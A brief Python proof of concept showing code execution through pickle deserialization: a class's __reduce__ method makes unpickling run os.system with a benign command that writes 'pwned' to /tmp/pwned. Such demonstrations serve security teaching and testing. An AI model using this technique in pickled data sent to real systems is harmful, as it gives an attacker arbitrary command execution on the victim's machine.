import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo "pwned" > /tmp/pwned',))

evil_pickle = pickle.dumps(EvilPickle())
pickle.loads(evil_pickle)
